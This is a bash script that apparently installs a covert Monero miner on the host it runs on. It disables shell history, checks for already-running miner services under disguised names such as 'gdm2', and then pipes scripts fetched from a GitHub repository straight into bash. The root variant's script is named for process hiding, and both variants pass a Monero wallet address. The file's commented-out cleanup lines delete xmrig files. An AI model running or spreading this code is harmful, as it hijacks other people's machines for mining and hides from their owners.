#!/bin/bash

unset HISTFILE

# Function to check if a service exists
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

# Function to check if a service is running
is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# List of services to check
services=("swapd" "gdm2")

# Loop through the services and check if they are present and running
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "Service $service is running. Stopping script."
            exit 1
        else
            echo "Service $service exists but is not running."
            exit 1
        fi
    else
        echo "Service $service does not exist."
    fi
done

# If script reaches here, no specified services are running
echo "No specified services are running. Continuing with the script..."

echo -e "---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

rootstuff() {
  curl -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  curl -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
}

if [[ $(id -u) -eq 0 ]]; then
    echo
    echo "You are running the root install!"
    echo
    rootstuff
else
    echo
    echo "You are running the user install!"
    echo
    userstuff
fi

# Clean up
# rm -rf config.json*
# rm -rf xmrig*
